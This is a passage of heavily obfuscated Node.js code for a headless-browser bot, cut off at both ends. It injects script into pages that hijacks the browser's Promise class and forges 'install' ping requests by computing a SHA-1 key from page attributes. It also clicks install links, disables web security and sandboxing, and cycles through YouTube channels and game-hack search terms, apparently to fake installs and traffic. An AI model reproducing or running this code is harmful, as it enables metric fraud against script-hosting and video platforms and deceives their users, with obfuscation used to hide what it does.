                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x11af + 0xfb8 + 0x237 ? (this['block'] = P[-0x2610 + -0x1 * -0x2a5 + -0x237b * -0x1], this['start'] = N - (0x1dfb + -0xeb7 * -0x2 + -0x3b29), this['hash'](), this['hashed'] = -0x2 * -0xe9f + -0x21a2 + 0x465) : this['start'] = N;
                }
                return this['bytes'] > -0xb9c9 * 0x131b3 + -0xb88894c7 * 0x1 + 0x29662f551 && (this['hBytes'] += this['bytes'] / (-0x15ab6b14c + -0xe67e4a78 + 0x34134fbc4) << 0x1c81 + 0xa4f * -0x1 + -0x1232, this['bytes'] = this['bytes'] % (0x1e2fecd7c + 0x190e7cfa0 + -0x1c * 0x166ccec1)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0xc1b + -0x230f + 0x96f * 0x5;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0xa * 0x35f + 0xad * 0x29 + 0x611] = this['block'], J[K >> 0xd8d + 0x285 + -0x1010] |= x[-0x6e1 * -0x3 + 0x1fc6 + 0x2 * -0x1a33 & K], this['block'] = J[0x77f * 0x5 + 0x1 * 0xd48 + -0x32b3], K >= -0x34b * 0x2 + -0x1 * -0x1d04 + -0x2 * 0xb1b && (this['hashed'] || this['hash'](), J[0x2 * 0x612 + 0x1 * -0x998 + 0x1 * -0x28c] = this['block'], J[0x2b8 + 0xed9 + 0x1 * -0x1181] = J[0xcbb + -0x198c + 0xcd2] = J[0x248e + -0x1 * -0x1cc9 + -0x4155] = J[0x11a7 + -0xeac * 0x2 + 0xbb4] = J[-0x1 * -0x1821 + -0x861 + -0xd4 * 0x13] = J[-0x21c1 + 0x541 * 0x7 + -0x301] = J[-0x1e79 + 0x350 * -0xb + 0xd63 * 0x5] = J[-0x5 * -0x573 + -0x1 * 0xd06 + -0xe32] = J[-0x1 * -0x2629 + 0x4c5 * -0x3 + 0x1 * -0x17d2] = J[-0x5d * -0x3f + 0x262 + -0x193c] = J[-0x7d3 * -0x3 + 0x13aa + -0x2b19] = J[-0x1a60 + 0x553 * -0x5 + 0x3e * 0xdb] = J[-0xce7 + -0x1 * 0x17 + 0xd0a] = J[-0x45e + -0x6ae + -0x3 * -0x3b3] = J[-0x48a + -0x25 * -0x8b + -0xf7f] = J[-0x1 * 0x1529 + -0xaf * -0x2b + -0x82d] = -0xafc + -0xd93 * 0x1 + 0x188f), J[0x2 * -0xfdb + -0xe54 + 0x2e18] = this['hBytes'] << 0x1067 + -0x16a9 + 0x645 | this['bytes'] >>> -0x1019 + -0x1555 + 0x258b, J[-0xb5 * -0xf + -0x65e * 0x3 + 0x88e] = this['bytes'] << 0x47 * 0x4f + -0x1a7 * -0x15 + -0x3899 * 0x1, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x1cb + 0xd * 0x18e + -0x125b; J < 0x22db + -0x84b * -0x1 + -0x2ad6; ++J)
                K = Q[J - (0x3ec + -0x885 + 0x4 * 0x127)] ^ Q[J - (0x12c3 + 0x13ba + -0x2675)] ^ Q[J - (-0x20c * 0x7 + 0x1 * 0x1073 + -0x211 * 0x1)] ^ Q[J - (-0x6 * 0x2ed + 0x31c * -0xc + 0x36ee * 0x1)], Q[J] = K << 0x9f1 + -0x1e6 + 0x1 * -0x80a | K >>> -0x438 + 0x197d + -0x1526 * 0x1;
              for (J = -0x1 * 0x261a + 0x1ae3 + 0xb37; J < -0x35 * 0x6d + -0xcc4 + -0x7 * -0x50f; J += 0x622 * 0x6 + -0xeba * 0x1 + -0x1 * 0x160d)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x158d + 0x1 * -0x567 + 0x1021 * -0x1 | L >>> 0x11 * 0x199 + 0x21ff + -0x3d0d) + (M & N | ~M & O) + P + (-0xbeb4677 + -0x1a2 * 0x564dd + 0x2 * 0x379e3875) + Q[J] << -0xec1 * -0x2 + -0xd12 * 0x1 + -0x20e * 0x8) << -0x5 * 0x297 + 0xa85 * -0x1 + -0x177d * -0x1 | P >>> 0x13e * -0x11 + 0x1 * -0xe72 + 0x18d * 0x17) + (L & (M = M << -0xe3 * -0x15 + 0x122c + 0xe5 * -0x29 | M >>> -0x1014 + -0x1 * -0xf95 + 0x81) | ~L & N) + O + (-0x158a5fa1 * 0x2 + -0x1e024d27 * 0x4 + 0xfda06d77) + Q[J + (0x315 * -0x7 + 0xdf * -0x29 + 0x1 * 0x394b)] << -0x1d36 + -0x7e * 0x13 + -0x4d2 * -0x8) << 0x1 * 0xf3b + -0x11d4 + 0xa * 0x43 | O >>> -0x1 * 0x17d3 + -0x1295 + 0x1 * 0x2a83) + (P & (L = L << -0x9d9 * -0x1 + 0x21f7 + -0x31f * 0xe | L >>> 0x2e * -0x71 + -0xbd * 0x12 + 0x176 * 0x17) | ~P & M) + N + (0x175953fd * 0x7 + -0x22dba * 0x3194 + 0x23143736) + Q[J + (0xd * -0x182 + -0x1de6 + -0x2 * -0x18c1)] << 0x4 * 0x3b7 + -0x18 * -0x40 + -0x3 * 0x6f4) << -0x4bd * -0x1 + 0x8 * 0xb + -0x510 | N >>> 0x9 * 0x91 + -0xf65 + -0xa67 * -0x1) + (O & (P = P << 0xb34 + -0x1c1a + 0x1104 | P >>> 0x173 + 0x3 * 0x351 + -0xf3 * 0xc) | ~O & L) + M + (-0x8aa466f * 0x7 + -0xdf616b4 * -0x8 + 0x426f * 0x981e) + Q[J + (0x20db * -0x1 + -0x1d8d + 0x3e6b)] << -0x3ce + 0x2f6 + 0xd8) << 0x22b6 + 0xe * 0x183 + -0x37db | M >>> -0x2685 + 0x1 * 0x4f1 + 0x21af * 0x1) + (N & (O = O << 0x1edd + -0xec * 0x2 + 0x1ce7 * -0x1 | O >>> -0x1b6 * 0x11 + -0x18ff + -0x1 * -0x3617) | ~N & P) + L + (0x26e * -0x1dd2fc + 0x69aac435 + -0x37b1 * -0x1076c) + Q[J + (-0x26 * 0x43 + 0x170c + -0xd16)] << 0xcad + 0x1 * -0x4df + -0x14d * 0x6, N = N << 0x53 * 0x47 + 0x245d + -0x1da2 * 0x2 | N >>> -0xce8 + 0x53b + 0x7af;
              for (; J < -0x9 * 0x3ac + -0xbb * -0x27 + 0x4b7; J += 0x2f * -0xb9 + 0xf1d * 0x1 + 0x12df * 0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x2001 + 0x247 + 0x31 * -0xb3 | L >>> 0x1 * 0x102a + -0x3e2 * -0x8 + -0x2f1f * 0x1) + (M ^ N ^ O) + P + (-0x890c43 * -0xeb + -0xd41c29df + 0xc527d3ff) + Q[J] << 0xbcb + 0x9 * 0x91 + -0x10e4) << -0x67 * -0x3d + 0x926 * -0x2 + -0x1 * 0x63a | P >>> 0xb2 * 0x22 + -0x22f8 + 0xb6f) + (L ^ (M = M << 0x1d04 + -0xf41 + -0x7 * 0x1f3 | M >>> -0x1 * -0x12ae + -0x25ac + 0x13 * 0x100) ^ N) + O + (0xaf05338d + -0x2e1 * -0x1516af + -0x7ce195bb) + Q[J + (0x1 * 0x224e + -0x1 * -0x9e3 + -0x4 * 0xb0c)] << -0x76 * 0x54 + -0x933 + 0x2feb) << -0x7e1 + -0x1 * -0x1481 + -0xc9b | O >>> 0x179b + -0x7f7 * -0x4 + -0x4 * 0xdd7) + (P ^ (L = L << -0xd6f * 0x1 + 0x120f + -0x482 | L >>> -0x1 * -0x85e + 0x12e1 + -0x1b3d) ^ M) + N + (-0x8c673b6d * 0x1 + 0xd974db4 + 0xeda9d95a) + Q[J + (-0x1107 + -0x11 * 0x14e + 0x2737)] << -0x186d + -0x19a7 + -0x502 * -0xa) << 0xf9f * -0x1 + 0x3ec + 0x258 * 0x5 | N >>> -0x71 * -0xc + 0x7aa * -0x1 + -0xd3 * -0x3) + (O ^ (P = P << 0xcb * -0x9 + 0x27 * 0xe3 + -0x1b54 | P >>> 0x145 + 0x1337 * 0x2 + -0x469 * 0x9) ^ L) + M + (0x575f * 0x713 + 0x1 * 0xd3ca7cea + 0x5 * -0x14abbade) + Q[J + (-0x4d5 * 0x1 + -0x1db7 + 0x228f)] << 0x863 * 0x2 + 0x130 * 0x1 + -0x11f6) << -0x28d + 0x17 * 0xc1 + 0xec5 * -0x1 | M >>> 0x90e + -0x1 * 0x223 + -0x368 * 0x2) + (N ^ (O = O << 0xd39 + 0x586 + 0x13 * -0xfb | O >>> 0x3 * -0x602 + 0x9f5 + 0x1 * 0x813) ^ P) + L + (-0xb7769d * -0x34 + -0x9c595685 + -0x3a * -0x3f6e1d5) + Q[J + (-0xef5 + 0x116f + -0x276)] << 0x25f * 0x7 + -0x12a5 + 0x2 * 0x106, N = N << 0x1ea5 + -0x1fad + 0x93 * 0x2 | N >>> 0x19d1 + 0x1fe1 + -0x39b0;
              for (; J < 0x99e + 0x185 * -0x15 + 0x1687; J += -0x5 * -0xe7 + 0xdee + 0x2 * -0x936)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x2251 + -0x24a + -0x2002 | L >>> 0x1dda + -0x14bc + -0x903) + (M & N | M & O | N & O) + P - (0x2acfc4d1 * -0x3 + -0x18a8 * -0x38637 + 0x9a6e557f) + Q[J] << 0x6 * -0x10d + 0x1d3c + -0x16ee) << -0x2e0 * 0x6 + -0x4e1 + 0x276 * 0x9 | P >>> 0x1f * -0xc3 + -0x1 * -0x19e + 0x161a) + (L & (M = M << -0x2395 + -0x7 * 0x24a + 0x33b9 * 0x1 | M >>> 0x23f1 + 0x1 * 0x1931 + -0x6 * 0xa30) | L & N | M & N) + O - (-0x19b8 * 0x3e5f0 + 0x8a95787 + 0xcc7ca01d) + Q[J + (0x1a51 + 0x3 * -0x30d + 0x17 * -0xbf)] << -0xcf7 + 0x136 * 0xe + -0x3fd) << -0x1 * -0x11f1 + -0x65 * 0xb + -0x3d * 0x39 | O >>> -0x10b6 + 0xdb3 + 0x31e) + (P & (L = L << 0x3 * -0x371 + 0x1e90 + 0x1 * -0x141f | L >>> -0x1a29 + 0x1ef6 + -0x4cb) | P & M | L & M) + N - (0x9406abd * -0x12 + 0x87423a5e + -0x20093b2 * -0x48) + Q[J + (-0x2fe * -0xb + -0x9e0 * -0x1 + -0x2ac8)] << 0xb84 + -0x10f * -0x11 + 0x5 * -0x5e7) << -0x127a + 0x21f * -0x8 + 0x511 * 0x7 | N >>> -0x1 * -0xc72 + 0x3 * 0xad3 + -0x2cd0) + (O & (P = P << -0x20ed + -0xf3e + -0x3049 * -0x1 | P >>> 0x1304 + 0xe66 + -0x2168) | O & L | P & L) + M - (-0x13c * -0xb4e05b + -0x885b7f8e + 0x19fad25e) + Q[J + (-0x10f * -0x12 + -0x718 + -0x1b5 * 0x7)] << 0x6 * -0x461 + -0x14f + 0x1b95) << 0x2436 + 0x15ba + 0x1 * -0x39eb | M >>> -0xf * 0x10b + 0x1f9b + -0xfdb) + (N & (O = O << -0x1 * 0x1354 + 0x1 * -0x1f82 + 0x32f4 | O >>> -0x19 * -0x10d + -0x652 * 0x1 + -0x13f1) | N & P | O & P) + L - (-0x1c323bd7 * 0x3 + -0x70036f4b + 0x6 * 0x339510fe) + Q[J + (0x3b * 0x14 + -0x21 * -0x121 + -0x3 * 0xdf3)] << -0x14 + 0x2f3 * 0x6 + -0x29 * 0x6e, N = N << -0x266f + 0x1860 + -0x13 * -0xbf | N >>> -0x2 * -0xeaa + -0x418 + -0x193a * 0x1;
              for (; J < -0x9 * 0x1 + 0xc96 * -0x3 + -0x1 * -0x261b; J += -0x2046 + -0xc8b + -0x2 * -0x166b)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x197 * 0x10 + 0x176b + -0x1d * -0x12 | L >>> -0x255f + 0x21bd + -0x3 * -0x13f) + (M ^ N ^ O) + P - (0x48ef47a0 + 0x153406bd * -0x1 + 0x1e1fd47) + Q[J] << 0x2078 + 0x175d + -0x37d5) << 0xc4f * 0x1 + 0x139 + -0xd83 | P >>> -0x2216 + -0x52a + 0x275b) + (L ^ (M = M << 0x60d * 0x2 + -0x21bb * -0x1 + 0x53 * -0x8d | M >>> 0xde1 + 0x1490 + -0x226f) ^ N) + O - (0x35c1b55e + -0x60fb353 + 0x5eb3c1f) + Q[J + (0x135d * -0x1 + 0x989 * -0x3 + 0x2ff9)] << -0x3 * 0x53 + -0x710 + 0x809) << 0x1a52 + 0x774 + 0x1 * -0x21c1 | O >>> 0x1358 + 0x2146 + 0x1181 * -0x3) + (P ^ (L = L << -0x1539 + -0x19 * 0x10a + 0x2f51 * 0x1 | L >>> 0x251a + 0x17a4 + 0x1 * -0x3cbc) ^ M) + N - (0x3fe02793 + 0x933 * 0x34f23 + 0x54d6 * -0x7ad3) + Q[J + (-0x217 * 0x12 + 0x1 * 0x10cd + 0x6f1 * 0x3)] << -0xc22 * 0x2 + 0x1e * -0xdb + 0x31ee) << -0x22f1 + 0x73d * -0x1 + 0x2a33 | N >>> 0x1e04 + 0x636 * 0x3 + 0x121 * -0x2b) + (O ^ (P = P << -0xba9 + -0x977 * -0x1 + 0x250 | P >>> 0x21fe + 0x11f7 * 0x1 + -0x33f3) ^ L) + M - (-0x2a3d * 0x2e11 + -0x5302ab1b * -0x1 + -0x15cba8e4) + Q[J + (-0x23 * 0xad + -0x402 + 0x1bac)] << 0x17bd + 0x156f + -0x2d2c) << 0x22 * 0xfb + -0x2240 + 0xef | M >>> 0x53 * 0x57 + 0x1b64 + -0x377e) + (N ^ (O = O << -0x1315 * 0x1 + -0x1d10 + 0x3043 | O >>> 0x2 * 0x12cd + -0x2 * 0x2d2 + -0x1ff4) ^ P) + L - (-0x1c835b1 + 0x12b49 * -0x166d + 0x519d27f0) + Q[J + (-0x2 * -0x7e2 + 0x729 + -0xf * 0x187)] << -0x126f * 0x1 + -0xc6c * -0x2 + -0x669 * 0x1, N = N << -0x2 * 0x630 + 0x1 * -0x28f + 0xf0d * 0x1 | N >>> -0x1eb7 + -0x16f6 + -0x35af * -0x1;
              this['h0'] = this['h0'] + L << 0x14 + -0x2 * -0xbae + -0x5dc * 0x4, this['h1'] = this['h1'] + M << -0x2b * -0xc7 + 0xa3a * -0x3 + 0x13 * -0x25, this['h2'] = this['h2'] + N << -0x1 * 0x22e5 + 0x16c7 + 0xc1e, this['h3'] = this['h3'] + O << -0x1e9 * -0x4 + 0x435 * -0x6 + 0x2ef * 0x6, this['h4'] = this['h4'] + P << 0x10dd * 0x1 + 0x1027 * -0x2 + 0xf71;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x16eb + 0x161 * 0xd + -0x16 * 0x1da & -0x5 * 0x4eb + 0xdc7 + 0xadf] + w[J >> -0x850 + 0x1 * -0x1987 + 0x21ef & -0x96f * 0x2 + -0x6 * 0x50a + -0x1063 * -0x3] + w[J >> -0xb7 * 0xf + -0x1 * 0x409 + 0xed6 & -0x19f4 + -0x2124 * 0x1 + 0x3b27] + w[J >> -0x3e6 * 0x2 + 0x1e86 + -0x16aa & 0x513 + -0x1 * 0x16f + -0x395] + w[J >> 0x1da8 + 0x25cf + -0x436b & 0x922 + 0x76b * 0x1 + -0x107e] + w[J >> 0xa19 + -0x1b * -0x169 + -0x3024 & -0x24a4 + -0x710 + 0x293 * 0x11] + w[J >> -0x13 * 0x68 + 0x3d * 0x10 + -0x4 * -0xfb & -0x58f * 0x1 + -0x5 * -0x4ba + -0x1204] + w[-0x1 * 0xc4f + -0x1846 + 0x24a4 & J] + w[K >> 0x5ab * -0x1 + 0x6a9 + -0x1 * 0xe2 & 0xe * -0x1e2 + -0xc42 + 0x26ad] + w[K >> -0xc1c + 0x1297 + -0x6d * 0xf & -0x18ba + -0xa39 + 0x2302] + w[K >> -0x14b0 + -0x2475 + -0x303 * -0x13 & 0x21b4 + 0x23c2 + -0x4567] + w[K >> -0x1174 + 0x21a1 * -0x1 + 0x3325 & -0xd1b * -0x1 + 0x1 * 0xe3c + -0x1b48] + w[K >> 0x18f0 + -0xc * -0x1a1 + -0x4 * 0xb1c & -0x237d + 0x6 * -0x185 + -0x1 * -0x2caa] + w[K >> -0x187f * -0x1 + 0x2 * -0xe55 + 0x433 & 0x1cfd + 0x2be + 0x1 * -0x1fac] + w[K >> -0xd97 + -0x5 * 0x21b + 0x1822 & -0x16b6 + 0x1 * -0x43e + 0x1b03] + w[-0x437 * 0x2 + -0xf4e + 0x17cb & K] + w[L >> 0x2637 + -0xa9 * 0xf + -0x17c * 0x13 & 0x43a * 0x4 + 0x2577 * 0x1 + -0x3650] + w[L >> -0x7e1 * 0x3 + 0xef8 + -0x1 * -0x8c3 & -0x1e63 + -0x3 * 0xae + -0x6c * -0x4d] + w[L >> -0x37 + 0x1 * -0xe8b + 0xed6 & 0x52 * 0x58 + -0xd * 0x177 + -0x916] + w[L >> 0xd3 * -0x16 + -0x9 * 0xb2 + 0xc3a * 0x2 & -0x14d1 + -0x25 * -0xa7 + 0x1 * -0x343] + w[L >> -0x1fab + -0x2539 * 0x1 + 0x44f0 & -0x112 * -0x24 + -0x702 + 0x3 * -0xa7d] + w[L >> 0x948 * -0x4 + 0x152c + 0xffc & 0x1 * -0x2172 + -0x202 * 0x2 + 0x2585 * 0x1] + w[L >> -0xbbb + -0x3 * 0xcbc + 0x31f3 & 0x24db + -0x1e7 * -0x2 + -0x289a] + w[-0x121d * 0x1 + -0x3d7 * -0x9 + -0x1063 & L] + w[M >> 0xbaf * 0x2 + -0xeca + -0x43c * 0x2 & 0x2b * 0x2d + 0x207b + -0x27fb] + w[M >> 0x5dd * 0x6 + -0x29 * 0x26 + -0x3a0 * 0x8 & 0x16a0 + -0x2 * -0x95f + 0x2c1 * -0xf] + w[M >> -0x1711 + 0xa79 + -0x1 * -0xcac & -0xb55 * -0x3 + -0x5 * -0x77 + -0x2443] + w[M >> 0x57d * -0x2 + -0x3e * 0x88 + -0xd * -0x362 & 0x145b + 0xdad + -0x21f9] + w[M >> -0x14f5 + 0x1b14 + 0x5 * -0x137 & -0x1 * -0x2ad + -0x4 * -0x44e + 0x13d6 * -0x1] + w[M >> -0x1 * 0x11d7 + -0x4 * 0xb7 + 0x14bb & -0x1 * -0xcd1 + -0x1606 + 0x2 * 0x4a2] + w[M >> 0x1e74 + -0x103f + -0xe31 & 0x146c + 0xc * 0x10a + -0x20d5] + w[0x22c5 + -0x214 * 0x4 + -0x1a66 & M] + w[N >> -0x1 * -0x3e6 + -0x761 + 0x397 & 0x179 * 0x3 + 0x8a * 0x3d + -0x6 * 0x635] + w[N >> 0x19e5 + 0x1 * -0x24b6 + 0xae9 & 0x1b79 + 0x125b * -0x1 + 0x90f * -0x1] + w[N >> -0x1202 + 0x11 * 0x1ab + -0xef * 0xb & -0x146b + 0x1588 + -0x10e] + w[N >> 0x25b1 * 0x1 + 0x1d5d * -0x1 + -0x844 & -0x2 * 0xd0f + 0x34c + 0x1 * 0x16e1] + w[N >> 0x2185 + -0x215 + -0xe * 0x23e & -0x1 * -0x26da + 0x4b4 + -0x11 * 0x28f] + w[N >> -0x2637 + -0x7 * -0x281 + -0x198 * -0xd & 0x71 * -0x2 + -0x162 + 0x253] + w[N >> -0xea4 * -0x1 + -0x236c + 0x14cc & 0x335 + 0x1 * -0xe39 + -0x1 * -0xb13] + w[-0x5 * -0x4d + -0x2d1 * 0xd + -0x232b * -0x1 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x15b * 0x1 + -0x97e * -0x2 + -0x1189 & -0x2192 + 0x3cf + -0x2 * -0xf61,
                J >> 0x1c9 * -0x7 + -0x65 * -0xe + 0x709 * 0x1 & 0x1712 + 0x2f7 + -0x190a,
                J >> -0x1456 * 0x1 + -0x8b7 + 0x1d15 & -0xc * 0x219 + 0x1f10 + -0x4e5,
                0xc82 * 0x1 + -0x1c86 + 0x1103 & J,
                K >> -0x1550 + 0x1c50 + -0x1a * 0x44 & 0x1e9 * -0x5 + 0xc * -0x1d2 + 0x2064,
                K >> -0x63a * 0x4 + 0x1 * -0x1f5b + 0x3853 * 0x1 & 0x1 * 0x20e3 + -0x1564 + -0xa80,
                K >> -0x1a3f + -0x2d0 + -0x1d17 * -0x1 & 0x1510 + -0x1 * 0xb90 + -0x881,
                -0x2b9 * 0x8 + -0x26ca + 0x3d91 & K,
                L >> 0x2 * 0xa22 + 0xbda + 0x2006 * -0x1 & 0xd * 0x251 + 0x7 * -0x22d + -0x2d * 0x4f,
                L >> 0x203f + 0x26b8 + 0x46e7 * -0x1 & 0xcd5 + -0x1 * 0x1ac9 + -0x1 * -0xef3,
                L >> 0x2 * -0x8fb + -0x851 + 0x1a4f * 0x1 & 0x3 * 0x4ee + 0x16f * 0x1a + -0x3311,
                -0x11 * 0xdf + 0x26bd * 0x1 + -0x7a5 * 0x3 & L,
                M >> -0x69 * -0x45 + -0x29d * 0xb + 0x8a & -0x249 + 0xb74 + -0x82c,
                M >> 0x1c75 + 0x93a + -0x259f & 0x3 * -0x4f + 0x1457 + -0x1 * 0x126b,
                M >> 0x2 * 0x427 + 0x231d + -0x2b63 & 0x1337 + 0x4 * 0x168 + -0xda * 0x1c,
                -0x1703 + 0x1147 * -0x1 + -0x32d * -0xd & M,
                N >> 0x5 * 0x6c2 + 0x1 * -0x1fb9 + -0x1 * 0x1f9 & 0x81 * 0x1e + -0x1 * 0x2402 + 0x15e3,
                N >> -0x2511 * -0x1 + 0x2157 + 0x8 * -0x8cb & 0x7 * -0x4eb + 0x25f0 + 0x17 * -0x1c,
                N >> 0x419 * -0x6 + 0x1 * 0x1b75 + -0x2d7 & 0x13ff + -0x193 * -0xb + -0x2451,
                0x22cf + 0x1 * 0x2428 + -0x45f8 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x10d + 0x62f + 0x728 * -0x1), (K = new DataView(J))['setUint32'](-0xf95 * -0x1 + 0xc81 + 0x2cf * -0xa, this['h0']), K['setUint32'](0x2 * 0x95b + 0x81f + -0x1ad1, this['h1']), K['setUint32'](-0x94f + 0xd3 * 0x2b + -0x1a1a, this['h2']), K['setUint32'](0x1002 + 0x11b6 + -0x21ac, this['h3']), K['setUint32'](-0x900 * -0x4 + -0x71 * 0x41 + 0x109 * -0x7, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x4be * 0x6 + 0x33 * 0x4a + -0x123 * 0x26];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x1238 * 0x1 + 0x1fba + 0x6c1 * -0x2;
            J[0xb4 + -0x1919 + 0x1865]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x130f + -0x5 * -0x85 + 0x39c * -0x6] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x29c + -0x28d * -0x7 + -0x1476), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0xc * 0x269 + -0x2e7 + -0x1a04;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x2 * 0x17 + -0x1917 + 0x1f21), Promise['resolve'](-0xa * -0x293 + 0x2548 * 0x1 + -0x3f05);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x933 + 0x48a + 0x4a9; j < 0xc74 * -0x2 + 0x498 + 0x1451; j++)
    i();
}
const NETWORK_PATIENCE = -0x1881 + -0x175f + -0x20 * -0x279 + (-0xc47 + 0x1c28 + 0xd5 * -0x5) * Math['random'](),
  MM_NETWORK_PATIENCE = (0xa9 * 0x5 + -0x7bb * 0x3 + 0x13e7) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;

function a() {
  const bm = [
    'lidate',
    '_[Krunker_',
    'parent-hei',
    'catch',
    'ed7TWHKDr4',
    'EdjNzMHdteHKoq',
    'E8ove8kUiCoIB2i',
    'ng-soon',
    'CMjLyxn0ihn1BG',
    'zwfZEwzVCMSUBW',
    'ChrZl2j5lxnPDa',
    'https://gr',
    'tufjtG',
    'WQpdUmk2W6im',
    'WRddKeiDdCkNqmozW4lcKq',
    'FCoosSk9m8k7kcGhfW',
    'DxnLCKfJDgLVBG',
    'gXOCi3OTW53dT3nU',
    'en-US,en;q',
    '044-zhihu-',
    'rtGLquuLqKyLrq',
    'qXvtW5qHyCowW77dMd0',
    'CMCVzw4VC2nYAq',
    'control',
    '3_1)\x20Apple',
    'AgXPz2H0CW',
    'nmolESkRWRPZhCoWW4nT',
    'lmkyWQf9W7K'
  ];
  a = function() {
    return bm;
  };
  return a();
}
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    U(0xf, 'YLJV') + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x8f3 + 0x510 + -0xe03; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + 